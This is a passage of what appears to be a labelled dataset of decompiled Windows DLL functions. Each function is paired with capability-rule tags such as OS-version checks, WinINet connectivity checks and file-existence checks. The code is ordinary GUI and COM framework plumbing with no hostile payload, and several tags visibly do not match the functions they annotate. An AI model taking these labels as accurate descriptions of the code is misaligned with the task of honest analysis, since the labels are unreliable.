uVar1) {\n        return -0x7ffdfff2;\n    }\n    if (*(in_stack_00000030 + 0x14) != 0) {\n        puVar11 = in_stack_00000030[1];\n        uVar9 = uVar10;\n        do {\n            if (uVar1 <= *puVar11) {\n                return -0x7ffdfff2;\n            }\n            uVar7 = uVar9 + 1;\n            uVar10 = uVar7;\n            uVar8 = *puVar11;\n            puVar11 = puVar11 + 1;\n            apiStack168[uVar8] = *in_stack_00000030 + uVar9 * 0x18;\n            uVar9 = uVar10;\n        } while (uVar7 < *(in_stack_00000030 + 0x14));\n    }\n    if (uVar10 < uVar1) {\n        piVar5 = *in_stack_00000030 + uVar10 * 0x18;\n        do {\n            iVar3 = uVar10;\n            uVar8 = iVar3 + 1;\n            uVar10 = uVar8;\n            apiStack168[(uVar1 - iVar3) - 1] = piVar5;\n            piVar5 = piVar5 + 3;\n        } while (uVar8 < uVar1);\n    }\n    iVar3 = -0x7ffdfffd;\n    puVar12 = auStackX8;\n    if (in_stack_00000048 != NULL) {\n        puVar12 = in_stack_00000048;\n    }\n    puVar6 = auStack72;\n    if (in_stack_00000038 != NULL) {\n        puVar6 = in_stack_00000038;\n    }\n    (*_sym.imp.OLEAUT32.dll_VariantClear)();\n    if (0x12 < arg2 + 0x139aU) goto code_r0x00018001516c;\n    // switch table (19 cases) at 0x18001519c\n    switch(*((arg2 + 0x139aU) * 4 + 0x18001519c) + 0x180000000) {\n    case 0x180014a09:\n        if (*(in_stack_00000030 + 2) == 1) {\n            iStack200 = *apiStack168[0];\n            iStack192 = apiStack168[0][1];\n            iStack184 = apiStack168[0][2];\n            iVar3 = (**(*arg1 + 200))(arg1, &iStack200);\n            goto code_r0x00018001516c;\n        }\n        break;\n    case 0x180014a4a:\n        if (*(in_stack_00000030 + 2) == 2) {\n            if (*apiStack168[0] != 3) {\n                iVar3 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(aiStack128, apiStack168[0], 0, 3);\n                if (iVar3 < 0) goto code_r0x000180014d53;\n                apiStack168[0] = aiStack128;\n            }\n            uVar2 = *(apiStack168[0] + 1);\n            if (*apiStack168[1] != 3) {\n                iVar3 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(aiStack128, apiStack168[1], 0, 3);\n                if (iVar3 < 0) {\ncode_r0x000180015098:\n                    *puVar12 = 1;\n                    goto code_r0x00018001516c;\n                }\n                apiStack168[1] = aiStack128;\n            }\n            iVar3 = (**(*arg1 + 0xc0))(arg1, uVar2, *(apiStack168[1] + 1), puVar6);\n            goto code_r0x00018001516c;\n        }\n        break;\n    case 0x180014ad6:\n        if (*(in_stack_00000030 + 2) == 2) {\n            if (*apiStack168[0] != 3) {\n                iVar3 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(aiStack128, apiStack168[0], 0, 3);\n                if (iVar3 < 0) goto code_r0x000180014d53;\n                apiStack168[0] = aiStack128;\n            }\n            iStack200 = *apiStack168[1];\n            iStack192 = apiStack168[1][1];\n            iStack184 = apiStack168[1][2];\n            iVar3 = (**(*arg1 + 0xb8))(arg1, *(apiStack168[0] + 1), &iStack200, puVar6);\n            goto code_r0x00018001516c;\n        }\n        break;\n    case 0x180014b4f:\n        iVar4 = iStack104;\n        if (*(in_stack_00000030 + 2) == 5) {\n            while (((*apiStack168[0] & 0x4000) != 0 && ((*apiStack168[0] & 0xf) != 0))) {\n                if ((*apiStack168[0] & 0xc) == 0) {\n                    iVar4 = apiStack168[0][1];\n                }\n                else {\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(apiStack168[0][1]);\n                    *apiStack168[0][1] = 3;\n                    iVar4 = apiStack168[0][1] + 8;\n                }\n            }\n            *puVar12 = 0;\n            iStack200 = *piStack136;\n            iStack192 = piStack136[1];\n            iStack184 = piStack136[2];\n            iVar3 = (**(*arg1 + 0xb0))(arg1, iVar4, iStack96, iStack88, uStack80, &iStack200);\n            goto code_r0x00018001516c;\n        }\n        break;\n    case 0x180014c04:\n        if (*(in_stack_00000030 + 2) == 2) {\n            if (*apiStack168[0] != 3) {\n                iVar3 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(aiStack128, apiStack168[0], 0, 3);\n                if (iVar3 < 0) goto code_r0x000180014d53;\n                apiStack168[0] = aiStack128;\n            }\n            iStack200 = *apiStack168[1];\n            iStack192 = apiStack168[1][1];\n            iStack184 = apiStack168[1][2];\n            iVar3 = (**(*arg1 + 0xa8))(arg1, *(apiStack168[0] + 1), &iStack200);\n            goto code_r0x00018001516c;\n        }\n        break;\n    case 0x180014c7a:\n        if (*(in_stack_00000030 + 2) == 1) {\n            iStack200 = *apiStack168[0];\n            iStack192 = apiStack168[0][1];\n            iStack184 = apiStack168[0][2];\n            iVar3 = (**(*arg1 + 0xa0))(arg1, &iStack200, puVar6 + 4);\ncode_r0x000180015020:\n            if (-1 < iVar3) {\n                *puVar6 = 8;\n            }\n            goto code_r0x00018001516c;\n        }\n        break;\n    case 0x180014cbf:\n        iVar3 = (**(*arg1 + 0x98))(arg1, puVar6);\n        goto code_r0x00018001516c;\n    case 0x180014cd4:\n        iVar3 = (**(*arg1 + 0x90))(arg1, puVar6);\n        goto code_r0x00018001516c;\n    case 0x180014ce9:\n        if (*(in_stack_00000030 + 2) == 1) {\n            iStack200 = *apiStack168[0];\n            iStack192 = apiStack168[0][1];\n            iStack184 = apiStack168[0][2];\n            iVar3 = (**(*arg1 + 0x88))(arg1, &iStack200, puVar6 + 4);\n            goto code_r0x000180015020;\n        }\n        break;\n    case 0x180014d2e:\n        if (*(in_stack_00000030 + 2) == 2) {\n            if (((*apiStack168[0] & 0x4000) != 0) && ((*apiStack168[0] & 0xc) == 0)) {\n                iVar3 = -0x7ffdfffb;\ncode_r0x000180014d53:\n                *puVar12 = 0;\n                goto code_r0x00018001516c;\n            }\n            if (*apiStack168[0] == 0x400c) {\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(apiStack168[0][1]);\n                *apiStack168[0][1] = 8;\n                piVar5 = apiStack168[0][1] + 8;\n            }\n            else if (*apiStack168[0] == 0x4008) {\n                piVar5 = apiStack168[0][1];\n            }\n            else {\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(apiStack168[0]);\n                piVar5 = apiStack168[0] + 1;\n                *apiStack168[0] = 8;\n            }\n            iStack200 = *apiStack168[1];\n            iStack192 = apiStack168[1][1];\n            iStack184 = apiStack168[1][2];\n            iVar3 = (**(*arg1 + 0x80))(arg1, piVar5, &iStack200, puVar6 + 4);\n            goto code_r0x00018001513c;\n        }\n        break;\n    case 0x180014de6:\n        if (*(in_stack_00000030 + 2) == 1) {\n            iStack200 = *apiStack168[0];\n            iStack192 = apiStack168[0][1];\n            iStack184 = apiStack168[0][2];\n            iVar3 = (**(*arg1 + 0x78))(arg1, &iStack200, puVar6 + 4);\n            goto code_r0x000180015020;\n        }\n        break;\n    case 0x180014e28:\n        if (*(in_stack_00000030 + 2) == 1) {\n            iStack200 = *apiStack168[0];\n            iStack192 = apiStack168[0][1];\n            iStack184 = apiStack168[0][2];\n            iVar3 = (**(*arg1 + 0x70))(arg1, &iStack200, puVar6);\n            goto code_r0x00018001516c;\n        }\n        break;\n    case 0x180014e69:\n        if (*(in_stack_00000030 + 2) == 1) {\n            iStack200 = *apiStack168[0];\n            iStack192 = apiStack168[0][1];\n            iStack184 = apiStack168[0][2];\n            iVar3 = (**(*arg1 + 0x68))(arg1, &iStack200, puVar6);\n            goto code_r0x00018001516c;\n        }\n        break;\n    case 0x180014eaa:\n        if (*(in_stack_00000030 + 2) == 1) {\n            iStack200 = *apiStack168[0];\n            iStack192 = apiStack168[0][1];\n            iStack184 = apiStack168[0][2];\n            iVar3 = (**(*arg1 + 0x60))(arg1, &iStack200, puVar6 + 4);\n            goto code_r0x000180015020;\n        }\n        break;\n    case 0x180014eec:\n        if ((in_stack_00000028 & 2) == 0) {\n            if ((in_stack_00000028 & 4) == 0) goto code_r0x000180014fd9;\n            if (*(in_stack_00000030 + 2) == 2) {\n                iStack200 = *apiStack168[0];\n                iStack192 = apiStack168[0][1];\n                iStack184 = apiStack168[0][2];\n                if (*apiStack168[1] != 8) {\n                    iVar3 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(aiStack128, apiStack168[1], 0, 3);\n                    if (iVar3 < 0) goto code_r0x000180015098;\n                    apiStack168[1] = aiStack128;\n                }\n                iStack104 = iStack200;\n                iStack96 = iStack192;\n                iStack88 = iStack184;\n                iVar3 = (**(*arg1 + 0xd8))(arg1, &iStack104, apiStack168[1][1]);\n                goto code_r0x00018001516c;\n            }\n        }\n        else if (*(in_stack_00000030 + 2) == 1) {\n            iStack200 = *apiStack168[0];\n            iStack192 = apiStack168[0][1];\n            iStack184 = apiStack168[0][2];\n            iVar3 = (**(*arg1 + 0x58))(arg1, &iStack200, puVar6 + 4);\n            goto code_r0x000180015020;\n        }\n        break;\n    case 0x180014fd9:\ncode_r0x000180014fd9:\n        if ((in_stack_00000028 & 2) == 0) {\n            if ((in_stack_00000028 & 4) == 0) goto code_r0x0001800150e6;\n            if (*(in_stack_00000030 + 2) == 2) {\n                iStack104 = *apiStack168[0];\n                iStack96 = apiStack168[0][1];\n                iStack88 = apiStack168[0][2];\n                if (*apiStack168[1] != 8) {\n                    iVar3 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(aiStack128, apiStack168[1], 0, 3);\n                    if (iVar3 < 0) goto code_r0x000180015098;\n                    apiStack168[1] = aiStack128;\n                }\n                iStack200 = iStack104;\n                iStack192 = iStack96;\n                iStack184 = iStack88;\n                iVar3 = (**(*arg1 + 0xd0))(arg1, &iStack200, apiStack168[1][1]);\n                goto code_r0x00018001516c;\n            }\n        }\n        else if (*(in_stack_00000030 + 2) == 1) {\n            iStack104 = *apiStack168[0];\n            iStack96 = apiStack168[0][1];\n            iStack88 = apiStack168[0][2];\n            iVar3 = (**(*arg1 + 0x50))(arg1, &iStack104, puVar6 + 4);\n            goto code_r0x000180015020;\n        }\n        break;\n    case 0x1800150e6:\ncode_r0x0001800150e6:\n        if (*(in_stack_00000030 + 2) == 1) {\n            iStack104 = *apiStack168[0];\n            iStack96 = apiStack168[0][1];\n            iStack88 = apiStack168[0][2];\n            iVar3 = (**(*arg1 + 0x48))(arg1, &iStack104, puVar6 + 4);\n            goto code_r0x00018001515d;\n        }\n        break;\n    case 0x18001512e:\n        iVar3 = (**(*arg1 + 0x40))(arg1, puVar6 + 4);\ncode_r0x00018001513c:\n        if (-1 < iVar3) {\n            *puVar6 = 3;\n        }\n        goto code_r0x00018001516c;\n    case 0x18001514f:\n        iVar3 = (**(*arg1 + 0x38))(arg1, puVar6 + 4);\ncode_r0x00018001515d:\n        if (-1 < iVar3) {\n            *puVar6 = 9;\n        }\n        goto code_r0x00018001516c;\n    }\n    iVar3 = -0x7ffdfff2;\ncode_r0x00018001516c:\n    (*_sym.imp.OLEAUT32.dll_VariantCopy)(aiStack128);\n    return iVar3;\n}\n",
        "token_count": 4095
    },
    "18001557": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * fcn.18001557a(int32_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    while( true ) {\n        if (*(arg1 + 4) == 0) {\n            return NULL;\n        }\n        if ((((*arg1 == arg2) && (arg1[1] == arg3)) && (arg1[2] <= arg4)) && (arg4 < arg1[3] || arg4 == arg1[3])) break;\n        arg1 = arg1 + 8;\n    }\n    return arg1;\n}\n",
        "token_count": 129
    },
    "180015d7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nint64_t fcn.180015d78(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int64_t iVar3;\n    uint in_stack_00000028;\n    uint in_stack_00000030;\n    uint in_stack_00000038;\n    uint in_stack_00000040;\n    ulong in_stack_00000048;\n    ulong in_stack_00000050;\n    ulong in_stack_00000058;\n    ulong in_stack_00000060;\n    ulong uStack32;\n    int64_t iStack24;\n    \n    uStack32 = 0;\n    iVar3 = fcn.180014058();\n    iVar1 = fcn.180013598(*(iVar3 + 0xd8), &uStack32);\n    iStack24 = 0;\n    if (iVar1 == 0) {\n        iVar3 = 0;\n    }\n    else {\n        iVar3 = (*_sym.imp.USER32.dll_CreateWindowExW)\n                          (arg1, arg2, arg3, arg4, in_stack_00000028, in_stack_00000030, in_stack_00000038, \n                           in_stack_00000040, in_stack_00000048, in_stack_00000050, in_stack_00000058, in_stack_00000060\n                           , iVar1);\n        if (iVar1 != 2) {\n            iStack24 = iVar3;\n            if (iVar3 != 0) {\n                uVar2 = 0;\n            }\n            else {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            }\n            fcn.18001357c(0, uStack32);\n            if (iVar3 == 0) {\n                (*_sym.imp.KERNEL32.dll_SetLastError)(uVar2);\n            }\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 414
    },
    "180015f4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.180015f40(ulong *arg1)\n\n{\n    if (*(arg1 + 1) != 0) {\n        fcn.18001357c(0, *arg1);\n    }\n    return;\n}\n",
        "token_count": 51
    },
    "18001778": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nulong * fcn.18001778c(int64_t lpModuleName, ulong *arg2)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    \n    if (*(lpModuleName + 0x20) == 0) {\n        if (*(lpModuleName + 8) == 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(*(lpModuleName + 0x18));\n            *(lpModuleName + 8) = iVar1;\n            if (iVar1 == 0) {\n                iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(*(lpModuleName + 0x18));\n                *(lpModuleName + 8) = iVar1;\n                *(lpModuleName + 0x10) = iVar1 != 0;\n            }\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*(lpModuleName + 8), \"InitCommonControls\");\n        *(lpModuleName + 0x20) = uVar2;\n    }\n    *arg2 = *(lpModuleName + 0x20);\n    return arg2;\n}\n",
        "token_count": 237
    },
    "18001780": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.180017800(int64_t arg1)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    ulong uStackX24;\n    uchar auStackX32 [8];\n    \n    uStackX24 = 0;\n    iVar1 = fcn.180014058();\n    iVar2 = fcn.180013598(*(iVar1 + 0xd8), &uStackX24);\n    if (iVar2 != 0) {\n        fcn.18001778c(arg1, auStackX32);\n        pcVar3 = *(arg1 + 0x20);\n        if (pcVar3 == NULL) {\n            fcn.180012514();\n        }\n        (*pcVar3)();\n        if (iVar2 != 2) {\n            fcn.18001357c(0, uStackX24);\n        }\n    }\n    return;\n}\n",
        "token_count": 198
    },
    "18001787": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nulong * fcn.180017878(int64_t lpModuleName, ulong *arg2)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    \n    if (*(lpModuleName + 0x28) == 0) {\n        if (*(lpModuleName + 8) == 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(*(lpModuleName + 0x18));\n            *(lpModuleName + 8) = iVar1;\n            if (iVar1 == 0) {\n                iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(*(lpModuleName + 0x18));\n                *(lpModuleName + 8) = iVar1;\n                *(lpModuleName + 0x10) = iVar1 != 0;\n            }\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*(lpModuleName + 8), \"InitCommonControlsEx\");\n        *(lpModuleName + 0x28) = uVar2;\n    }\n    *arg2 = *(lpModuleName + 0x28);\n    return arg2;\n}\n",
        "token_count": 237
    },
    "1800179a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nulong * fcn.1800179a0(int64_t lpModuleName, ulong *arg2)\n\n{\n    int64_t iVar1;\n    ulong uVar2;\n    \n    if (*(lpModuleName + 0x20) == 0) {\n        if (*(lpModuleName + 8) == 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(*(lpModuleName + 0x18));\n            *(lpModuleName + 8) = iVar1;\n            if (iVar1 == 0) {\n                iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(*(lpModuleName + 0x18));\n                *(lpModuleName + 8) = iVar1;\n                *(lpModuleName + 0x10) = iVar1 != 0;\n            }\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*(lpModuleName + 8), \"InitNetworkAddressControl\");\n        *(lpModuleName + 0x20) = uVar2;\n    }\n    *arg2 = *(lpModuleName + 0x20);\n    return arg2;\n}\n",
        "token_count": 239
    },
    "180017d5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint64_t fcn.180017d54(void)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    bool bVar5;\n    \n    iVar2 = fcn.180028cec(0x180069c00, 0x180010dc0);\n    if (iVar2 != 0) {\n        iVar4 = fcn.180014058();\n        if ((*(iVar4 + 0x28) != '\\0') && (*(iVar2 + 0x48) != 0)) {\n            (*_sym.imp.USER32.dll_UnhookWindowsHookEx)();\n            *(iVar2 + 0x48) = 0;\n        }\n        bVar5 = *(iVar2 + 0x28) == 0;\n        if (!bVar5) {\n            *(iVar2 + 0x28) = 0;\n        }\n        return bVar5;\n    }\n    fcn.180012514();\n    pcVar1 = swi(3);\n    uVar3 = (*pcVar1)();\n    return uVar3;\n}\n",
        "token_count": 243
    },
    "18001843": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18001843c(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    uchar auStack344 [32];\n    uint uStack312;\n    uint32_t uStack308;\n    uint64_t uStack24;\n    \n    uStack24 = *0x180067ce0 ^ auStack344;\n    iVar4 = fcn.180014058();\n    if (iVar4 == 0) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    if (*(iVar4 + 0xe4) == 0) {\n        fcn.180033c90(&uStack312, 0, 0x114);\n        uStack312 = 0x114;\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetVersionExW)(&uStack312);\n        if (iVar2 == 0) {\n            fcn.180012514();\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        if (5 < uStack308) {\n            iVar5 = fcn.180014058();\n            uVar3 = fcn.180017a14(*(*(iVar5 + 200) + 0x10));\n            *(iVar4 + 0xe0) = uVar3;\n        }\n        *(iVar4 + 0xe4) = 1;\n    }\n    fcn.180032ea0(uStack24 ^ auStack344);\n    return;\n}\n",
        "token_count": 352
    },
    "1800185f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nulong fcn.1800185f4(int64_t *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    ulong uVar4;\n    ulong in_stack_00000028;\n    uint32_t auStack120 [2];\n    int64_t iStack112;\n    ulong uStack104;\n    uchar auStack96 [24];\n    uchar auStack72 [48];\n    \n    uStack104 = 0xfffffffffffffffe;\n    iVar3 = fcn.180028cec(0x180069c00, 0x180010dc0);\n    iStack112 = iVar3;\n    if (iVar3 == 0) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        uVar4 = (*pcVar1)();\n        return uVar4;\n    }\n    fcn.180035e40(auStack72, iVar3 + 0x98, 0x30);\n    *(iVar3 + 0x98) = arg2;\n    *(iVar3 + 0xa0) = arg3;\n    *(iVar3 + 0xa8) = arg4;\n    *(iVar3 + 0xb0) = in_stack_00000028;\n    if ((arg3 == 2) && (arg1[0x13] != 0)) {\n        (**(*arg1[0x13] + 0xc0))(arg1[0x13], 0);\n    }\n    auStack120[0] = 0;\n    if (arg3 == 0x110) {\n        fcn.180015fd0(arg1, auStack96, auStack120);\n    }\n    uVar2 = auStack120[0];\n    uVar4 = (**(*arg1 + 0x220))(arg1, arg3, arg4, in_stack_00000028);\n    if (arg3 == 0x110) {\n        fcn.18001855c(arg1, auStack96, uVar2);\n    }\n    fcn.180035e40(iVar3 + 0x98, auStack72, 0x30);\n    return uVar4;\n}\n",
        "token_count": 488
    },
    "1800189b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint64_t * fcn.1800189b4(int64_t *arg1)\n\n{\n    int64_t *arg1_00;\n    int32_t iVar1;\n    int64_t *piVar2;\n    \n    if ((arg1 == NULL) || (arg1[8] == 0)) {\n        arg1 = NULL;\n    }\n    else {\n        iVar1 = (**(*arg1 + 0x250))();\n        piVar2 = arg1;\n        if (iVar1 == 0) {\n            arg1 = fcn.180018964(arg1);\n            piVar2 = arg1;\n        }\n        while (arg1_00 = piVar2,  arg1_00 != NULL) {\n            piVar2 = fcn.180018964(arg1_00);\n            arg1 = arg1_00;\n        }\n    }\n    return arg1;\n}\n",
        "token_count": 191
    },
    "18001938": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nulong fcn.180019384(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    int64_t iVar4;\n    \n    fcn.18001ca7c(0xc, arg2);\n    iVar2 = fcn.18002878c(0x18006cf30, 0x180018534);\n    if (iVar2 == 0) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        uVar3 = (*pcVar1)();\n        return uVar3;\n    }\n    if (*(iVar2 + 0x10) == 0) {\n        iVar4 = fcn.180015ea4(\"hhctrl.ocx\");\n        *(iVar2 + 8) = iVar4;\n        if (iVar4 != 0) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar4, \"HtmlHelpW\");\n            *(iVar2 + 0x10) = iVar4;\n            if (iVar4 != 0) goto code_r0x00018001941e;\n            (*_sym.imp.KERNEL32.dll_FreeLibrary)(*(iVar2 + 8));\n            *(iVar2 + 8) = 0;\n        }\n        uVar3 = 0;\n    }\n    else {\ncode_r0x00018001941e:\n        int.18001cb10(0xc);\n        uVar3 = (**(iVar2 + 0x10))(arg1, arg2, arg3, arg4);\n    }\n    return uVar3;\n}\n",
        "token_count": 357
    },
    "180019f4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.180019f48(int64_t arg1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    \n    iVar3 = fcn.180028cec(0x180069c00, 0x180010dc0);\n    if (iVar3 == 0) {\n        fcn.180012514();\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    if (*(iVar3 + 0x28) != arg1) {\n        if (*(iVar3 + 0x48) == 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n            iVar4 = (*_sym.imp.USER32.dll_SetWindowsHookExW)(5, 0x180019cc0, 0, uVar2);\n            *(iVar3 + 0x48) = iVar4;\n            if (iVar4 == 0) {\n                fcn.1800124cc();\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n        }\n        *(iVar3 + 0x28) = arg1;\n    }\n    return;\n}\n",
        "token_count": 268
    },
    "18001a24": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nulong fcn.18001a24c(int64_t *arg1, uint64_t arg2, uint64_t arg3, int64_t *arg4)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    ulong uVar6;\n    code **ppcVar7;\n    uchar *puVar8;\n    int64_t iVar9;\n    ulong uVar10;\n    uint64_t uVar11;\n    uint64_t uVar12;\n    int16_t iVar13;\n    uint32_t *puVar14;\n    uint32_t *puVar15;\n    uint64_t *in_stack_00000028;\n    uint64_t *in_stack_fffffffffffffee8;\n    uint64_t uStack264;\n    int32_t iStack256;\n    int32_t iStack252;\n    uint uStack248;\n    uchar auStack240 [8];\n    int64_t iStack232;\n    ulong uStack208;\n    uchar auStack200 [64];\n    int64_t iStack136;\n    int64_t iStack40;\n    \n    uStack208 = 0xfffffffffffffffe;\n    iVar4 = arg2;\n    uVar11 = arg2 & 0xffffffff;\n    uStack264 = 0;\n    uStack248 = 0x7fffffff;\n    if (iVar4 == 0x111) {\n        iVar4 = (**(*arg1 + 0x1e0))(arg1, arg3, arg4);\n        if (iVar4 == 0) {\n            return 0;\n        }\n        uStack264 = 1;\n    }\n    else if (iVar4 == 0x4e) {\n        if ((*arg4 == 0) || (iVar4 = (**(*arg1 + 0x1e8))(arg1, arg3, arg4, &uStack264),  iVar4 == 0)) {\n            return 0;\n        }\n    }\n    else {\n        if (iVar4 == 6) {\n            uVar6 = fcn.180017c38(arg4);\n            arg2 = arg3;\n            fcn.180019a08(arg1, arg3, uVar6);\n        }\n        uVar5 = uVar11;\n        iVar13 = arg4;\n        if (uVar5 == 0x20) {\n            arg2 = iVar13;\n            iVar4 = fcn.180019aac(arg1, arg2, arg4 >> 0x10 & 0xffff);\n            if (iVar4 != 0) {\n                uStack264 = 1;\n                goto code_r0x00018001afdf;\n            }\n        }\n        if (((arg1[0x13] != 0) && (0 < *(arg1[0x13] + 0xe0))) &&\n           (((0x1ff < uVar5 && (uVar5 < 0x20a)) || (((0xff < uVar5 && (uVar5 < 0x110)) || (uVar5 - 0x281 < 0x11)))))) {\n            in_stack_fffffffffffffee8 = &uStack264;\n            iVar4 = (**(*arg1[0x13] + 0x128))(arg1[0x13], uVar11, arg3, arg4, in_stack_fffffffffffffee8);\n            arg2 = uVar11;\n            if (iVar4 != 0) goto code_r0x00018001afdf;\n        }\n        ppcVar7 = (**(*arg1 + 0x50))();\n        uVar12 = (ppcVar7 ^ uVar5) & 0x1ff;\n        uStack248 = 7;\n        fcn.18001ca7c(7, arg2);\n        uVar11 = 0x180069c20;\n        if ((uVar5 != *(uVar12 * 0x18 + 0x180069c20)) || (ppcVar7 != *(uVar12 * 0x18 + 0x180069c30))) {\n            *(uVar12 * 0x18 + 0x180069c20) = uVar5;\n            *(uVar12 * 0x18 + 0x180069c30) = ppcVar7;\n            pcVar2 = *ppcVar7;\n            do {\n                if (pcVar2 == NULL) {\n                    *(uVar12 * 0x18 + 0x180069c28) = 0;\n                    int.18001cb10(7);\n                    return 0;\n                }\n                if (uVar5 < 0xc000) {\n                    puVar14 = ppcVar7[1];\n                    